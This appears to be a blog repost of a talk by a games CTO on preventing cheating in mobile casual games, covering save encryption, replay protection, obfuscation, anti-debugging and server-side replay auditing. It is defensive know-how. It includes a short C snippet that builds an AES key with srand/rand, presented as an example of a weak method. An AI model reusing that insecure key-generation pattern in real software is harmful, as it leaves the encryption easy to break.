	<p style="margin: 0px; max-width: 100%; word-wrap: normal; min-height: 1em; white-space: pre-wrap; color: #3e3e3e; font-family: 'Helvetica Neue', Helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 微软雅黑, Arial, sans-serif; font-size: 16px; line-height: 25.6000003814697px; box-sizing: border-box !important"><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important"><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">乐元素CTO</span>凌聪分析了作弊(主要是弱联网休闲游戏的作弊)的影响，比如改变排行榜中的全局排行与好友排行，还会影响广告投放，带来经济损失。他从弱联网游戏可能存在的多种安全问题来分析玩家或破解者可能采用的手段以及研发商可以采取的对策。最后他总结了对各种问题的解决方案。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　存档被篡改：AES、限制专一、限制降级</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　协议被破解：AES、SSL/TLS、nonce防重放</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　盗号或用户伪装：用户标识符、社交账号绑定</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　工程被逆向破译：符号隐藏、标识符混淆、逻辑混淆</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　函数被Hook：隐藏和混淆、阻止跟踪调试、组织外挂启动</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　二进制程序被修改：验证校验码</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　内存被修改：内存加密</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　大招：上传用户操作和随机种子，数据监控+回放+人工审核</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">以下是对凌聪演讲内容的整理。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important"><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important"><span style="max-width: 100%; word-wrap: break-word; box-sizing: border-box !important; color: #8b0000">一、为什么要防作弊</span></span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(一)经济损失</span></strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　据我们调查，在电商网站上有很多卖作弊手段的道具，搜索网页也能发现非常多人在卖作弊手段，所以经济损失肯定是第一位的，《开心消消乐》的作弊使我们损失几百万。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(二)作弊的其他影响</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　今天我们主要讲弱联网的休闲游戏，就是可联网但是也支持离线玩。这是休闲游戏在当今市场环境里获得地位的重要手段，因为不联网的话相当于不能PK，不能跟好友对战和每日登陆等功能，这是很坏的。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　弱联网游戏影响最大的是排行榜，包括全局排名、地区排名和好友排名，如果你作弊了，这三个榜上用户投诉很多，对我们影响很大，有些用户发现有人作弊会流失掉，你就要用很多手段封杀那些作弊用户。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　另外是重度游戏，很多重度游戏需要本地计算 ，凡是客户端做的游戏都有可能作弊，所以重度游戏也需要防作弊 。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第三个是广告，因为广告可以直接骗你钱，我们曾经买过一次广告，当中居然有75%的量是假的。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　攻防战只要有逻辑放在前端本身就是不安全设计，但是人家的手段是进化的，而且当一个作弊手段出来的时候就会在淘宝上卖，这个传播是很严重的。有一种手段没防住，它扩散了的话就没有这么简单，扩散就影响你整个系统。所以不是80%拦了就OK的。有些时候有一个手段就让你的经济系统崩溃，需要你不断的优化。比如针对游戏攻击函数钩子，这个如果真的发生，损失就是很大。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(三)弱联网游戏可能存在的安全问题</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第一，存档被篡改和复制，造成你的损失。</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第二，本地配置被篡改。在离线游戏、休闲游戏里面可能有些配置被篡改掉。</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第三，帐号被盗和恶意修改。</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第四，内存被修改。我们有三种内存，第一种是传输型的内存，传输性内存是不用加密的，因为传输型内存都是一次性的。另外一种是永久型内存 ，这肯定是要加密的，用户状态比如你的血、精力值这些都是永久状态。第三种是暂态内存，比如《开心消消乐》打完一关，获取的金币和获取的经验都会暂存的，这个暂存它有可能查就的，这要进行一个加密。</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第五，网络协议被破解和重放攻击。</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第六，工程被逆向破译。现在有很多技术高超的人，可以反汇编你的代码 ，然后把你的工程逆向。</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第七，二进制程序可能被修改。刚才讲到的只要涉及到加解密，都会把加解密函数钩走，然后把它修改掉。</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第八，函数被挂起，被Hook。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(四)防止存档篡改</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　方法：加密肯定是需要的，建议强加密，建议用AES 256 CBC PKCS#7。必须使用安全的对称加密算法，建议使用AES加密算法，密钥256位或以上，工业级、速度快。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　密钥怎么保存?首先，密钥不要直接保存在代码里面，密钥是生成的。第二，密钥不要放在存档里面，这是很危险的。第三，密钥每次加密当场现算。第四，密钥的生产需要有随机度。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(五)存档协议设计</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第一，Magic number：标记存档类型。</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第二，版本号：标记加密方法类型。如果一个休闲游戏需要兼容两版本模式肯定需要版本号。</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第三，源数据哈希。源数据的哈希为什么要设计?要验证你解密后的存档数据是不是一致的。</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第四，初始向量。尽量每次都不要一样，否则很容易被反向。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(六)密钥的产生</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　密钥必须有一定的随机性，可以随机数产生但需要一些技巧，也可以哈希产生。密钥最好是生成，不要在代码里面去。比如我们看过一些破解程序，发现密钥直接写在字符串里面。</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　产生随机密钥的技巧：应使用工业级加密库的产生函数，这样更随机。</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　自己产生的随机数，如以下算法，实际上最多只有2的31次方种密钥，而加密算法要求2的256次方种。</span><br /><br /></p><ol class=" list-paddingleft-2" style="margin: 1em 2em; padding-left: 30px; list-style-type: none; max-width: 100%; word-wrap: break-word; color: #3e3e3e; font-family: 'Helvetica Neue', Helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 微软雅黑, Arial, sans-serif; font-size: 16px; line-height: 25.6000003814697px; box-sizing: border-box !important"><li style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important"><p style="margin: 0px; max-width: 100%; word-wrap: normal; min-height: 1em; white-space: pre-wrap; box-sizing: border-box !important">char key[32];<br /></p></li><li style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important"><p style="margin: 0px; max-width: 100%; word-wrap: normal; min-height: 1em; white-space: pre-wrap; box-sizing: border-box !important">srand(time(NULL));<br /></p></li><li style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important"><p style="margin: 0px; max-width: 100%; word-wrap: normal; min-height: 1em; white-space: pre-wrap; box-sizing: border-box !important">for(int i=0;i&lt;32;++i)&#123;<br /></p></li><li style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important"><p style="margin: 0px; max-width: 100%; word-wrap: normal; min-height: 1em; white-space: pre-wrap; box-sizing: border-box !important">key = rand() % 256;<br /></p></li><li style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important"><p style="margin: 0px; max-width: 100%; word-wrap: normal; min-height: 1em; white-space: pre-wrap; box-sizing: border-box !important">&#125;</p></li></ol><p style="margin: 0px; max-width: 100%; word-wrap: normal; min-height: 1em; white-space: pre-wrap; color: #3e3e3e; font-family: 'Helvetica Neue', Helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 微软雅黑, Arial, sans-serif; font-size: 16px; line-height: 25.6000003814697px; box-sizing: border-box !important"><br /></p><p style="margin: 0px; max-width: 100%; word-wrap: normal; min-height: 1em; white-space: pre-wrap; color: #3e3e3e; font-family: 'Helvetica Neue', Helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 微软雅黑, Arial, sans-serif; font-size: 16px; line-height: 25.6000003814697px; box-sizing: border-box !important"><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(七)初始向量的用法</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　尽量不要使用ECB，它的加密强度不够强，所以我们建议用CBC做加密比较稳妥。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　每次加密，初始向量都必须不同。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(八)阻止存档转移</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　玩家可能将存档发给他人破解(如淘宝卖家)，需阻止设备直接共享存档文件。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　可通过使用UDID参与加密，来阻止存档转移。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　方法1：UDID参与密钥产生</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　&ndash; KEY = RAWKEY &oplus; SHA256(UDID)</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　方法2：UDID参与IV产生</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　&ndash; IV = RAWIV &oplus; SHA256(UDID)</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　存档协议中只存储RAWIV</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　当你复制存档 给另外一个设备的时候设备打不开的，因为它的KEY不一样。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(九)限制存档降级</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　比如我们发现一个版本有漏洞，我们打了个补丁过去，结果用户发现之后赶紧把代码回滚到以前，然后再打开存档 ，这样的话就可以再次修改，这个就是存档降级。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　存档降级的解决办法，旧版本的存档被新版本程序读取之后，要转换为新存档版本。而新存档不能给旧程序读取。我们还做了在服务端校验，如果设备里面生了新存档 ，不能再用旧存档。 防止一个设备上来回存档的问题。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(十)内存修改</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　刚才讲了内存修改分三种内存，其中第二、第三种，暂存和永久性内存是必须要加密的。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　现在有两个修改器：之前有个八门神器，它就是对比内存 ，内存值变了两次之后，它找到你内存的偏移地址，可以定位到内存地址在哪里。八门神器我们当时比较好解决，用非常简单的加减法可以解决加密问题，因为它找不到原来的数据，或者不是整数，这样它也找不到。现在有一个更高级的，叫烧饼修改器，它能力挺强的，假设你修改的数加了个&ldquo;038&rdquo;，它一样可以找到。另外，它支持加减法，如果你的数据是加减法或者乘除法它能找到，所以内存的加密函数需要变化。防止内存修改最简单的方式是做一个加密的HashMap ，进的时候是加密的，出的时候是解密的，在函数里面加上一些较为强加密的算法就行了。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(十一)协议破解的几种可能性</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　协议破解一种方式是通过抓包工具，抓包完之后，如果你的协议没加密，用户可以伪造请求 ，也可以伪造服务器响应。玩家通过拦截服务器的响应做重放，客户端重放上次的请求。当然，玩家知道协议之后可以伪装成另外一个玩家，这是更恶劣的情节。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(十二)伪造请求的防范</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　加密肯定是需要的，加密的通讯协议最好自己写。建议AES。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(十三)伪造响应的防范</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　要么采用非对称签名验证方式防范 ，但是这个速度比较慢，不建议用。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　另外一个是用TLS，如果我们要用TLS的话要注意校验服务器的证书在客户端那，因为服务器的证书很容易被篡改 。比如它通讯的时候可以用自己的证书，这样的话是可以拦截你的协议的。如果程序破解了，函数直接就调用了。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(十四)重放攻击</strong><br /><br /></p><p style="margin: 0px; max-width: 100%; word-wrap: normal; min-height: 1em; white-space: pre-wrap; color: #3e3e3e; font-family: 'Helvetica Neue', Helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 微软雅黑, Arial, sans-serif; font-size: 16px; line-height: 25.6000003814697px; text-align: center; box-sizing: border-box !important"><img id="c2" style="border: 0px; max-width: 620px; word-wrap: break-word; cursor: pointer; box-sizing: border-box !important; height: auto !important; width: auto !important; visibility: visible !important" class="zoom" src="read-83.php-save_7512" tppabs="http://mmbiz.qpic.cn/mmbiz/uicUKliaDticRYRYLEWhg11Jqf0vG2wd475db2QocjiapGTlGHzIibDUGIjjNZu91n53EIvNtkHCmP5Bz0zwV1GPViaA/0" border="0" title="弱联网手游如何防作弊？" width="600" /></p><p style="margin: 0px; max-width: 100%; word-wrap: normal; min-height: 1em; white-space: pre-wrap; color: #3e3e3e; font-family: 'Helvetica Neue', Helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 微软雅黑, Arial, sans-serif; font-size: 16px; line-height: 25.6000003814697px; box-sizing: border-box !important"><br /></p><p style="margin: 0px; max-width: 100%; word-wrap: normal; min-height: 1em; white-space: pre-wrap; color: #3e3e3e; font-family: 'Helvetica Neue', Helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 微软雅黑, Arial, sans-serif; font-size: 16px; line-height: 25.6000003814697px; box-sizing: border-box !important"><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　刚才讲的响应服务器主要是不让别人破解我们的协议，重放攻击是什么?重复攻击是我不需要了解你的加密协议，我只需要重放就行了。我们有一个版本的游戏是出现过这样的问题，攻击者拦截你的请求，然后多次重放，如果你没有做校验，很容易导致你的数据不断的往上增加。这个最重要的是支付，比如你从APPLE拿到一个支付响应，回传给你服务器的时候，它抓住这个请求不断的重放，这样很容易造成重放的攻击。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　重放攻击最好的解决方案是中间加一个nonce。服务器的响应，服务器辨别你的时候它要看到，如果这个nonce是以前已经用过的就把它丢弃掉，为啥?因为这肯定是作假。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(十五)防范帐号伪装</strong><br /><br /></p><p style="margin: 0px; max-width: 100%; word-wrap: normal; min-height: 1em; white-space: pre-wrap; color: #3e3e3e; font-family: 'Helvetica Neue', Helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 微软雅黑, Arial, sans-serif; font-size: 16px; line-height: 25.6000003814697px; text-align: center; box-sizing: border-box !important"><img id="c3" style="border: 0px; max-width: 620px; word-wrap: break-word; cursor: pointer; box-sizing: border-box !important; height: auto !important; width: auto !important; visibility: visible !important" class="zoom" src="read-84.php-save_7512" tppabs="http://mmbiz.qpic.cn/mmbiz/uicUKliaDticRYRYLEWhg11Jqf0vG2wd475iaKHlPvkB5P2tIsFFthCGFyhDtsr50CgLtd8FdsjlGzziaIKtcNsB2HQ/0" border="0" title="弱联网手游如何防作弊？" width="600" /></p><p style="margin: 0px; max-width: 100%; word-wrap: normal; min-height: 1em; white-space: pre-wrap; color: #3e3e3e; font-family: 'Helvetica Neue', Helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 微软雅黑, Arial, sans-serif; font-size: 16px; line-height: 25.6000003814697px; box-sizing: border-box !important"><br /></p><p style="margin: 0px; max-width: 100%; word-wrap: normal; min-height: 1em; white-space: pre-wrap; color: #3e3e3e; font-family: 'Helvetica Neue', Helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 微软雅黑, Arial, sans-serif; font-size: 16px; line-height: 25.6000003814697px; box-sizing: border-box !important"><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　首先一个过程是登陆的过程，登陆的过程拿到Session Key,其他所有的请求都要使用这个，这个是服务器端生成的，服务器端可以每次校验这个SessionKey。我们是分开的，给用户看User lD，所以我们不要在传输协议仅放一个Userld，这个用户标识是服务器产生的，安全性就没有了，客户端把这个存起来，以后都用这个服务器标识跟后端通讯。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　SessionKey有两个作用，一个是防止多Session登陆，另外，SessionKey和UserlD是关联的，因为SessionKey每次都不一样，所以要伪造比较难。为什么不用用户标识?因为每次都传安全性是低的，是很危险的。所以做这两个主要是为了提高你的安全性。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(十六)程序被破解的几种情况</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　最关键的一个是程序被逆向了，它造成的后果 是有可能你的二进制程序被修改，有可能函数被外挂 Hook了，当然，内存被修改也是可能的，因为它知道你的加解密算法之后内存就会给修改。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(十七)防范程序被逆向破解的方法</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第一个关键是符号隐藏，函数符号表隐藏住。特别是加解密函数。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第二，关键字混淆。</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第三，程序逻辑混淆。</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第四，内存加密。</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第五，阻止动态跟踪调试。</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第六，二进制程序校验。这里除了你提交的主程序之外，另外一个也要防止篡改。</span><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第七，Lua脚本加密也很重要。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(十八)符号隐藏</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　尽量不用系统的函数库，因为系统的函数库你没有任何办法把它隐藏 ，它都是暴露在那的，只要你用它，它就可以挂接到钩子上去，所以尽量不要用。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　另外，重要的函数在模块里面，尽量用static函数。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第三，关键加密库要设置关闭符号表导出。你把输出函数符号表隐藏掉。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第四，Xcode配置Symbols Hidden By Default。我看国外很多游戏已经这么做了。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　另外，你可以通过nm命令可以查询到输出函数 。如果没有函数符号表输出就比较安全了。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(十九)标识符混淆</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　class-dump可读取Objc的类元数据，能看到类的方法和属性。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　无法关闭类元数据的导出，因为ObjC的面向对象机制需要。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　只能对类名、方法名、属性名进行字符串替换，让破解者无法看出接口的用途。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　ObjC的混淆方案是，在prefix.pch中使用#define替换标识符。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　工具是ios-class-guard。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　标识符混淆的缺点有，当父类是第三方库时，父类的函数无法混淆，但子类同名函数却混淆，就会错误，需要对第三方库的函数进行排除。不能使用ClassFromeNSString反射。接入Lua时需要查表才能调用正确方法。</span><br /><br /></p><p style="margin: 0px; max-width: 100%; word-wrap: normal; min-height: 1em; white-space: pre-wrap; color: #3e3e3e; font-family: 'Helvetica Neue', Helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 微软雅黑, Arial, sans-serif; font-size: 16px; line-height: 25.6000003814697px; text-align: center; box-sizing: border-box !important"><img id="c4" style="border: 0px; max-width: 620px; word-wrap: break-word; cursor: pointer; box-sizing: border-box !important; height: auto !important; width: auto !important; visibility: visible !important" class="zoom" src="read-85.php-save_7512" tppabs="http://mmbiz.qpic.cn/mmbiz/uicUKliaDticRYRYLEWhg11Jqf0vG2wd4758HR8vALkxnVUS9KvXMsSxQFKpLAHY0fZoaQbRle4hfa8KTAq0SmeUg/0" border="0" title="弱联网手游如何防作弊？" width="600" /></p><p style="margin: 0px; max-width: 100%; word-wrap: normal; min-height: 1em; white-space: pre-wrap; color: #3e3e3e; font-family: 'Helvetica Neue', Helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 微软雅黑, Arial, sans-serif; font-size: 16px; line-height: 25.6000003814697px; box-sizing: border-box !important"><br /></p><p style="margin: 0px; max-width: 100%; word-wrap: normal; min-height: 1em; white-space: pre-wrap; color: #3e3e3e; font-family: 'Helvetica Neue', Helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 微软雅黑, Arial, sans-serif; font-size: 16px; line-height: 25.6000003814697px; box-sizing: border-box !important"><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(二十)其他隐藏接口的方法</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　通过用C语言的static函数实现</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　通过ObjC-Runtime动态添加</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(二十一)程序逻辑混淆</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　通过打乱代码次序，增加花指令等手段，可以阻止骇客对工程进一步跟踪和分析，类似加壳，但iOS项目目前没有商用的加壳程序。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　或者用开源的程序逻辑混淆器obfuscator-llvm，用它替代XCode自带的llvm编译器。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(二十二)组织跟踪调试</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　GDB等调试工具可以跟踪程序运行，可以使用ptrace组织GDB依附APP进程。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　我们可以用GDB挂去调它的函数，只要看到有一个数字函数，我就可以看到你的输入输出参数 ，我只要会一点点汇编语言，就基本能看到你的参数 。所以我们需要防止这个GDB。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(二十三)二进制文件校验</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　程序启动时，需要判断二进制是否被修改过，以防止代码被篡改或被植入广告。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　我们在编译好包后，生成二进制文件的哈希，然后将版本号拼接起来作为校验码，用私钥生成校验码的签名，校验码和签名都存入一个文件中。由于没有私钥，玩家无法伪造校验码。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　</span><strong style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">(二十四)反盗号</strong><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　反盗号，如果离线的话非常容易盗号，越狱机器什么都可以改，所以我们需要防止它做这个事。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　第一个，我们最好有个网络帐户，如果用它用网络帐号登陆的话，就不让它用本地帐户校验了。如果是本地校验建议不要用可变的，自己在KeyChain里面存储一个UUID，如果你做越狱了，很可能会丢掉，安卓 上面就自己建一个文件。如果是它用了网络帐户登陆的话，它如果要恢复，比如说它重装了应用的话，可以通过这个网络帐户拿回它的信息，网络帐户有可能是Facebook、QQ、微博甚至自己用户名密码都是可以的。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　最后一个我们称之它为&ldquo;大招&rdquo;，上传用户行为数据以及随机种子以做到可重放。我们有一款游戏用了这个手段，我们把用户的行为和随机种子，因为我们所有的调入都是通过随机种子搞的，所以我们认为是个随机种子，这样通过游戏的模拟可以把现场在一个客户端重放，重放的话我们就可以看到这个用户是不是作弊了。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　这里面如果做这点话需要有两个手段，第一个，我们需要在客户端让这个传输数据和随机种子做到重放，另外，需要监控到数据的异常，因为我们重放用户数据行为之后很多时候需要人工判断这个数据是不是作弊的，所以我们需要首先有个数据监控系统，我们监控到某些用户的数据突然变了异常，接下来我们会重放这些用户数据，看看这些用户数据是不是有问题，如果用户在重放的过程发现结果并不是这样的，那他肯定作弊了。</span><br /><br /><span style="max-width: 100%; word-wrap: break-word !important; box-sizing: border-box !important">　　为什么说它是大招?因为有些时候是没有办法百分之百做到内存防篡改的，有些时候程序员忘了把显示在界面上的数据放到加密里面，玩家会修改你的数据，修改你的数据来作弊。</span></p>
	</div>
	<div class="textbox-bottom">
	</div>
	<div class="tags" style="display: none"> 
	</div>
</div><div class="textbox">
	<div class="textbox-calendar">
	<span class="textbox-calendar-month">Aug</span>
	<span class="textbox-calendar-day">18</span>
